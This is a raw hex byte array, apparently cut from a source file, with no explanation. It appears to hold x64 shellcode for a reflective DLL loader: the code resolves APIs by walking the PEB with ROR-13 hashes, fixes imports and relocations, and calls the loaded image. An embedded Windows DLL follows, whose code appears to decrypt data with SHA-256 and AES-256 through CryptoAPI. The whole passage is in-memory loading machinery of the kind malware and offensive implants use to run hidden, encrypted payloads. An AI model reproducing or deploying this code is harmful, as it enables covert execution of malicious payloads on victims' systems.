0xb7, 0xc6, 0x41, 0x8b, 0x11, 0x48, 0x1, 0x4, 0xa, 0x4d, 0x3, 0xd0, 0x41, 0x8b, 0x41, 0x4, 0x49, 0x3, 0xc1, 0x4c, 0x3b, 0xd0, 0xf, 0x85, 0x5f, 0xff, 0xff, 0xff, 0x4d, 0x8b, 0xca, 0x45, 0x39, 0x3a, 0xf, 0x85, 0x4a, 0xff, 0xff, 0xff, 0x44, 0x39, 0xbf, 0x94, 0x0, 0x0, 0x0, 0xf, 0x84, 0x82, 0x1, 0x0, 0x0, 0x8b, 0x8f, 0x90, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xef, 0x4c, 0x8d, 0x4, 0x19, 0x49, 0x8d, 0x40, 0xc, 0xeb, 0x7, 0x45, 0x3, 0xeb, 0x48, 0x8d, 0x40, 0x14, 0x44, 0x39, 0x38, 0x75, 0xf4, 0x41, 0x8b, 0xc4, 0x83, 0xe0, 0x4, 0x89, 0x45, 0xc0, 0x8b, 0xc1, 0xf, 0x84, 0x89, 0x0, 0x0, 0x0, 0x45, 0x3b, 0xeb, 0xf, 0x86, 0x80, 0x0, 0x0, 0x0, 0x41, 0xc1, 0xec, 0x10, 0x45, 0x8d, 0x5d, 0xff, 0x45, 0x8b, 0xd7, 0x45, 0x85, 0xdb, 0x74, 0x74, 0x4d, 0x8b, 0xc8, 0x41, 0xbe, 0xff, 0x7f, 0x0, 0x0, 0x41, 0xf, 0x10, 0x1, 0x33, 0xd2, 0x41, 0x8b, 0xcd, 0x41, 0x2b, 0xca, 0x69, 0xf6, 0xfd, 0x43, 0x3, 0x0, 0x41, 0x8b, 0xc6, 0xf7, 0xf1, 0x33, 0xd2, 0x81, 0xc6, 0xc3, 0x9e, 0x26, 0x0, 0x8d, 0x48, 0x1, 0x8b, 0xc6, 0xc1, 0xe8, 0x10, 0x41, 0x23, 0xc6, 0xf7, 0xf1, 0x41, 0x3, 0xc2, 0x41, 0xff, 0xc2, 0x48, 0x8d, 0xc, 0x80, 0x41, 0x8b, 0x54, 0x88, 0x10, 0x41, 0xf, 0x10, 0xc, 0x88, 0x41, 0xf, 0x11, 0x4, 0x88, 0x41, 0x8b, 0x41, 0x10, 0x41, 0x89, 0x44, 0x88, 0x10, 0x41, 0xf, 0x11, 0x9, 0x41, 0x89, 0x51, 0x10, 0x4d, 0x8d, 0x49, 0x14, 0x45, 0x3b, 0xd3, 0x72, 0xa1, 0x8b, 0x87, 0x90, 0x0, 0x0, 0x0, 0xeb, 0x4, 0x44, 0x8b, 0x65, 0xc0, 0x8b, 0xf0, 0x48, 0x3, 0xf3, 0x8b, 0x46, 0xc, 0x85, 0xc0, 0xf, 0x84, 0xb1, 0x0, 0x0, 0x0, 0x8b, 0x7d, 0xc0, 0x8b, 0xc8, 0x48, 0x3, 0xcb, 0xff, 0x55, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4c, 0x8b, 0xd0, 0x44, 0x8b, 0x36, 0x44, 0x8b, 0x7e, 0x10, 0x4c, 0x3, 0xf3, 0x4c, 0x3, 0xfb, 0x49, 0x8b, 0xe, 0x48, 0x85, 0xc9, 0x74, 0x5f, 0x48, 0x85, 0xc9, 0x79, 0x8, 0x45, 0xf, 0xb7, 0x6, 0x33, 0xd2, 0xeb, 0x32, 0x48, 0x8d, 0x53, 0x2, 0x33, 0xc0, 0x48, 0x3, 0xd1, 0x38, 0x2, 0x74, 0xe, 0x48, 0x8b, 0xca, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc0, 0x80, 0x39, 0x0, 0x75, 0xf5, 0x48, 0x89, 0x54, 0x24, 0x30, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x66, 0x89, 0x44, 0x24, 0x28, 0x66, 0x89, 0x44, 0x24, 0x2a, 0x4d, 0x8b, 0xcf, 0x49, 0x8b, 0xca, 0xff, 0x55, 0xd0, 0x49, 0x83, 0xc6, 0x8, 0x49, 0x83, 0xc7, 0x8, 0x49, 0x8b, 0xe, 0x48, 0x85, 0xc9, 0x74, 0x7, 0x4c, 0x8b, 0x54, 0x24, 0x38, 0xeb, 0xa1, 0x45, 0x33, 0xff, 0x85, 0xff, 0x74, 0x10, 0x41, 0x83, 0xfd, 0x1, 0x76, 0xa, 0x41, 0x69, 0xcc, 0xe8, 0x3, 0x0, 0x0, 0xff, 0x55, 0xf0, 0x8b, 0x46, 0x20, 0x48, 0x83, 0xc6, 0x14, 0x85, 0xc0, 0xf, 0x85, 0x56, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x7d, 0x30, 0x4c, 0x8b, 0x6d, 0xd0, 0x44, 0x39, 0xbf, 0xf4, 0x0, 0x0, 0x0, 0xf, 0x84, 0xa9, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xbf, 0xf0, 0x0, 0x0, 0x0, 0x49, 0x83, 0xc7, 0x4, 0x4c, 0x3, 0xfb, 0x45, 0x33, 0xe4, 0x41, 0x8b, 0x7, 0x85, 0xc0, 0xf, 0x84, 0x8a, 0x0, 0x0, 0x0, 0x8b, 0xc8, 0x48, 0x3, 0xcb, 0xff, 0x55, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8b, 0xc8, 0x41, 0x8b, 0x77, 0x8, 0x45, 0x8b, 0x77, 0xc, 0x48, 0x3, 0xf3, 0x4c, 0x3, 0xf3, 0x4c, 0x39, 0x26, 0x74, 0x5e, 0x49, 0x8b, 0x16, 0x48, 0x85, 0xd2, 0x79, 0x8, 0x44, 0xf, 0xb7, 0xc2, 0x33, 0xd2, 0xeb, 0x34, 0x4c, 0x8d, 0x43, 0x2, 0x49, 0x8b, 0xc4, 0x4c, 0x3, 0xc2, 0x45, 0x38, 0x20, 0x74, 0xe, 0x49, 0x8b, 0xd0, 0x48, 0xff, 0xc2, 0x48, 0xff, 0xc0, 0x44, 0x38, 0x22, 0x75, 0xf5, 0x4c, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x45, 0x33, 0xc0, 0x66, 0x89, 0x44, 0x24, 0x28, 0x66, 0x89, 0x44, 0x24, 0x2a, 0x4c, 0x8b, 0xce, 0x41, 0xff, 0xd5, 0x48, 0x83, 0xc6, 0x8, 0x49, 0x83, 0xc6, 0x8, 0x4c, 0x39, 0x26, 0x74, 0x7, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0xeb, 0xa2, 0x49, 0x83, 0xc7, 0x20, 0xe9, 0x6b, 0xff, 0xff, 0xff, 0x45, 0x33, 0xff, 0xf, 0xb7, 0x77, 0x14, 0x45, 0x8b, 0xf7, 0x48, 0x83, 0xc6, 0x28, 0x41, 0xbc, 0x1, 0x0, 0x0, 0x0, 0x66, 0x44, 0x3b, 0x7f, 0x6, 0xf, 0x83, 0xb, 0x1, 0x0, 0x0, 0x48, 0x3, 0xf7, 0x44, 0x39, 0x3e, 0xf, 0x84, 0xeb, 0x0, 0x0, 0x0, 0x8b, 0x46, 0x14, 0x8b, 0xc8, 0x81, 0xe1, 0x0, 0x0, 0x0, 0x20, 0x75, 0x17, 0xf, 0xba, 0xe0, 0x1e, 0x72, 0x11, 0x85, 0xc0, 0x78, 0xd, 0x45, 0x8b, 0xc4, 0x44, 0x89, 0x64, 0x24, 0x20, 0xe9, 0xa4, 0x0, 0x0, 0x0, 0x85, 0xc9, 0x75, 0x3c, 0xf, 0xba, 0xe0, 0x1e, 0x72, 0xa, 0x85, 0xc0, 0x79, 0x6, 0x44, 0x8d, 0x41, 0x8, 0xeb, 0x68, 0x85, 0xc9, 0x75, 0x28, 0xf, 0xba, 0xe0, 0x1e, 0x73, 0xa, 0x85, 0xc0, 0x78, 0x6, 0x44, 0x8d, 0x41, 0x2, 0xeb, 0x54, 0x85, 0xc9, 0x75, 0x14, 0xf, 0xba, 0xe0, 0x1e, 0x73, 0xa, 0x85, 0xc0, 0x79, 0x6, 0x44, 0x8d, 0x41, 0x4, 0xeb, 0x40, 0x85, 0xc9, 0x74, 0x5f, 0xf, 0xba, 0xe0, 0x1e, 0x72, 0xc, 0x85, 0xc0, 0x78, 0x8, 0x41, 0xb8, 0x10, 0x0, 0x0, 0x0, 0xeb, 0x2a, 0x85, 0xc9, 0x74, 0x49, 0xf, 0xba, 0xe0, 0x1e, 0x72, 0xc, 0x85, 0xc0, 0x79, 0x8, 0x41, 0xb8, 0x80, 0x0, 0x0, 0x0, 0xeb, 0x14, 0x85, 0xc9, 0x74, 0x33, 0xf, 0xba, 0xe0, 0x1e, 0x73, 0x11, 0x85, 0xc0, 0x78, 0xd, 0x41, 0xb8, 0x20, 0x0, 0x0, 0x0, 0x44, 0x89, 0x44, 0x24, 0x20, 0xeb, 0x21, 0x85, 0xc9, 0x74, 0x18, 0xf, 0xba, 0xe0, 0x1e, 0x73, 0x12, 0x44, 0x8b, 0x44, 0x24, 0x20, 0x85, 0xc0, 0xb9, 0x40, 0x0, 0x0, 0x0, 0x44, 0xf, 0x48, 0xc1, 0xeb, 0xdd, 0x44, 0x8b, 0x44, 0x24, 0x20, 0xf7, 0x46, 0x14, 0x0, 0x0, 0x0, 0x4, 0x74, 0xa, 0x41, 0xf, 0xba, 0xe8, 0x9, 0x44, 0x89, 0x44, 0x24, 0x20, 0x8b, 0x4e, 0xfc, 0x4c, 0x8d, 0x4c, 0x24, 0x20, 0x8b, 0x16, 0x48, 0x3, 0xcb, 0xff, 0x55, 0x0, 0xf, 0xb7, 0x47, 0x6, 0x45, 0x3, 0xf4, 0x48, 0x83, 0xc6, 0x28, 0x44, 0x3b, 0xf0, 0xf, 0x82, 0xf8, 0xfe, 0xff, 0xff, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x83, 0xc9, 0xff, 0xff, 0x55, 0x8, 0x44, 0x39, 0xbf, 0xd4, 0x0, 0x0, 0x0, 0x74, 0x24, 0x8b, 0x87, 0xd0, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x74, 0x18, 0x18, 0xeb, 0xf, 0x45, 0x33, 0xc0, 0x41, 0x8b, 0xd4, 0x48, 0x8b, 0xcb, 0xff, 0xd0, 0x48, 0x8d, 0x76, 0x8, 0x48, 0x8b, 0x6, 0x48, 0x85, 0xc0, 0x75, 0xe9, 0x4c, 0x8b, 0x4d, 0x18, 0x4d, 0x85, 0xc9, 0x74, 0x2f, 0x8b, 0x87, 0xa4, 0x0, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x25, 0x8b, 0xc8, 0x4c, 0x8b, 0xc3, 0x48, 0xb8, 0xab, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0x48, 0xf7, 0xe1, 0x8b, 0x8f, 0xa0, 0x0, 0x0, 0x0, 0x48, 0xc1, 0xea, 0x3, 0x48, 0x3, 0xcb, 0x41, 0x2b, 0xd4, 0x41, 0xff, 0xd1, 0x8b, 0x47, 0x28, 0x4d, 0x8b, 0xc4, 0x48, 0x3, 0xc3, 0x41, 0x8b, 0xd4, 0x48, 0x8b, 0xcb, 0xff, 0xd0, 0x8b, 0xb5, 0xb8, 0x0, 0x0, 0x0, 0x85, 0xf6, 0xf, 0x84, 0x97, 0x0, 0x0, 0x0, 0x44, 0x39, 0xbf, 0x8c, 0x0, 0x0, 0x0, 0xf, 0x84, 0x8a, 0x0, 0x0, 0x0, 0x8b, 0x8f, 0x88, 0x0, 0x0, 0x0, 0x48, 0x3, 0xcb, 0x44, 0x8b, 0x59, 0x18, 0x45, 0x85, 0xdb, 0x74, 0x78, 0x44, 0x39, 0x79, 0x14, 0x74, 0x72, 0x44, 0x8b, 0x49, 0x20, 0x41, 0x8b, 0xff, 0x8b, 0x51, 0x24, 0x4c, 0x3, 0xcb, 0x48, 0x3, 0xd3, 0x45, 0x85, 0xdb, 0x74, 0x5d, 0x45, 0x8b, 0x1, 0x45, 0x8b, 0xd7, 0x4c, 0x3, 0xc3, 0x74, 0x52, 0xeb, 0xd, 0xf, 0xbe, 0xc0, 0x44, 0x3, 0xd0, 0x41, 0xc1, 0xca, 0xd, 0x4d, 0x3, 0xc4, 0x41, 0x8a, 0x0, 0x84, 0xc0, 0x75, 0xec, 0x41, 0x3b, 0xf2, 0x75, 0x5, 0x48, 0x85, 0xd2, 0x75, 0x12, 0x41, 0x3, 0xfc, 0x49, 0x83, 0xc1, 0x4, 0x48, 0x83, 0xc2, 0x2, 0x41, 0x3b, 0xfb, 0x73, 0x22, 0xeb, 0xc3, 0x8b, 0x41, 0x1c, 0xf, 0xb7, 0xa, 0x48, 0x3, 0xc3, 0x8b, 0x95, 0xc8, 0x0, 0x0, 0x0, 0x44, 0x8b, 0x4, 0x88, 0x48, 0x8b, 0x8d, 0xc0, 0x0, 0x0, 0x0, 0x4c, 0x3, 0xc3, 0x41, 0xff, 0xd0, 0x48, 0x8b, 0xc3, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x9c, 0x24, 0xb0, 0x1, 0x0, 0x0, 0x48, 0x81, 0xc4, 0x70, 0x1, 0x0, 0x0, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x10, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x8b, 0xe9, 0x45, 0x33, 0xf6, 0x48, 0x8b, 0x50, 0x18, 0x4c, 0x8b, 0x4a, 0x10, 0x4d, 0x8b, 0x41, 0x30, 0x4d, 0x85, 0xc0, 0xf, 0x84, 0xb3, 0x0, 0x0, 0x0, 0x41, 0xf, 0x10, 0x41, 0x58, 0x49, 0x63, 0x40, 0x3c, 0x41, 0x8b, 0xd6, 0x4d, 0x8b, 0x9, 0xf3, 0xf, 0x7f, 0x4, 0x24, 0x46, 0x8b, 0x9c, 0x0, 0x88, 0x0, 0x0, 0x0, 0x45, 0x85, 0xdb, 0x74, 0xd2, 0x48, 0x8b, 0x4, 0x24, 0x48, 0xc1, 0xe8, 0x10, 0x66, 0x44, 0x3b, 0xf0, 0x73, 0x22, 0x48, 0x8b, 0x4c, 0x24, 0x8, 0x44, 0xf, 0xb7, 0xd0, 0xf, 0xbe, 0x1, 0xc1, 0xca, 0xd, 0x80, 0x39, 0x61, 0x7c, 0x3, 0x83, 0xc2, 0xe0, 0x3, 0xd0, 0x48, 0xff, 0xc1, 0x49, 0x83, 0xea, 0x1, 0x75, 0xe7, 0x4f, 0x8d, 0x14, 0x18, 0x45, 0x8b, 0xde, 0x41, 0x8b, 0x7a, 0x20, 0x49, 0x3, 0xf8, 0x45, 0x39, 0x72, 0x18, 0x76, 0x8e, 0x8b, 0x37, 0x41, 0x8b, 0xde, 0x49, 0x3, 0xf0, 0x48, 0x8d, 0x7f, 0x4, 0xf, 0xbe, 0xe, 0x48, 0xff, 0xc6, 0xc1, 0xcb, 0xd, 0x3, 0xd9, 0x84, 0xc9, 0x75, 0xf1, 0x8d, 0x4, 0x13, 0x3b, 0xc5, 0x74, 0xe, 0x41, 0xff, 0xc3, 0x45, 0x3b, 0x5a, 0x18, 0x72, 0xd5, 0xe9, 0x5e, 0xff, 0xff, 0xff, 0x41, 0x8b, 0x42, 0x24, 0x43, 0x8d, 0xc, 0x1b, 0x49, 0x3, 0xc0, 0xf, 0xb7, 0x14, 0x1, 0x41, 0x8b, 0x4a, 0x1c, 0x49, 0x3, 0xc8, 0x8b, 0x4, 0x91, 0x49, 0x3, 0xc0, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x20, 0x48, 0x8b, 0x6c, 0x24, 0x28, 0x48, 0x8b, 0x74, 0x24, 0x30, 0x48, 0x8b, 0x7c, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x10, 0x41, 0x5e, 0xc3, 0x4d, 0x5a, 0x90, 0x0, 0x3, 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0xff, 0xff, 0x0, 0x0, 0xb8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x1, 0x0, 0x0, 0xe, 0x1f, 0xba, 0xe, 0x0, 0xb4, 0x9, 0xcd, 0x21, 0xb8, 0x1, 0x4c, 0xcd, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x20, 0x63, 0x61, 0x6e, 0x6e, 0x6f, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6e, 0x20, 0x69, 0x6e, 0x20, 0x44, 0x4f, 0x53, 0x20, 0x6d, 0x6f, 0x64, 0x65, 0x2e, 0xd, 0xd, 0xa, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa3, 0x51, 0x26, 0x75, 0xe7, 0x30, 0x48, 0x26, 0xe7, 0x30, 0x48, 0x26, 0xe7, 0x30, 0x48, 0x26, 0x34, 0x42, 0x4b, 0x27, 0xe2, 0x30, 0x48, 0x26, 0x34, 0x42, 0x4d, 0x27, 0x62, 0x30, 0x48, 0x26, 0x34, 0x42, 0x4c, 0x27, 0xed, 0x30, 0x48, 0x26, 0xb5, 0x45, 0x4d, 0x27, 0xf8, 0x30, 0x48, 0x26, 0xb5, 0x45, 0x4c, 0x27, 0xe9, 0x30, 0x48, 0x26, 0xb5, 0x45, 0x4b, 0x27, 0xee, 0x30, 0x48, 0x26, 0x34, 0x42, 0x49, 0x27, 0xe2, 0x30, 0x48, 0x26, 0xe7, 0x30, 0x49, 0x26, 0x83, 0x30, 0x48, 0x26, 0x2e, 0x45, 0x4d, 0x27, 0xe6, 0x30, 0x48, 0x26, 0x2e, 0x45, 0x48, 0x27, 0xe6, 0x30, 0x48, 0x26, 0x2e, 0x45, 0x4a, 0x27, 0xe6, 0x30, 0x48, 0x26, 0x52, 0x69, 0x63, 0x68, 0xe7, 0x30, 0x48, 0x26, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x45, 0x0, 0x0, 0x64, 0x86, 0x6, 0x0, 0x61, 0xfe, 0xf, 0x67, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x0, 0x22, 0x20, 0xb, 0x2, 0xe, 0x1d, 0x0, 0xda, 0x0, 0x0, 0x0, 0xce, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x15, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x1, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x60, 0x1, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x40, 0x7c, 0x1, 0x0, 0x44, 0x0, 0x0, 0x0, 0x84, 0x7c, 0x1, 0x0, 0x3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x1, 0x0, 0xf0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x1, 0x0, 0x4c, 0x6, 0x0, 0x0, 0xe0, 0x67, 0x1, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x1, 0x0, 0x38, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x0, 0x0, 0xb0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x0, 0x0, 0x0, 0x60, 0xd9, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0xda, 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x60, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0x9c, 0x95, 0x0, 0x0, 0x0, 0xf0, 0x0, 0x0, 0x0, 0x96, 0x0, 0x0, 0x0, 0xde, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x40, 0x2e, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0x0, 0x40, 0x1d, 0x0, 0x0, 0x0, 0x90, 0x1, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x74, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0xc0, 0x2e, 0x70, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0xf0, 0xf, 0x0, 0x0, 0x0, 0xb0, 0x1, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x40, 0x5f, 0x52, 0x44, 0x41, 0x54, 0x41, 0x0, 0x0, 0xf4, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x1, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x90, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x40, 0x2e, 0x72, 0x65, 0x6c, 0x6f, 0x63, 0x0, 0x0, 0x4c, 0x6, 0x0, 0x0, 0x0, 0xd0, 0x1, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x92, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x42, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x4c, 0x89, 0x44, 0x24, 0x18, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x58, 0xc7, 0x44, 0x24, 0x20, 0x0, 0x0, 0x0, 0xf0, 0x41, 0xb9, 0x18, 0x0, 0x0, 0x0, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xff, 0x15, 0xcb, 0xdf, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xa, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xe9, 0xd8, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0xba, 0xc, 0x80, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0xff, 0x15, 0xc5, 0xdf, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xa, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xe9, 0xaa, 0x0, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x44, 0x8b, 0x44, 0x24, 0x78, 0x48, 0x8b, 0x54, 0x24, 0x70, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0xff, 0x15, 0xa7, 0xdf, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xa, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xe9, 0x84, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc9, 0x4c, 0x8b, 0x44, 0x24, 0x38, 0xba, 0x10, 0x66, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0xff, 0x15, 0x57, 0xdf, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x7, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xeb, 0x57, 0x48, 0x8d, 0x44, 0x24, 0x68, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x44, 0x24, 0x60, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xff, 0x15, 0x35, 0xdf, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x7, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xeb, 0x25, 0x33, 0xd2, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0xff, 0x15, 0x5, 0xdf, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0xff, 0x15, 0x2a, 0xdf, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xff, 0x15, 0xff, 0xde, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x58, 0xc7, 0x44, 0x24, 0x34, 0x0, 0x0, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x30, 0x20, 0x1, 0x0, 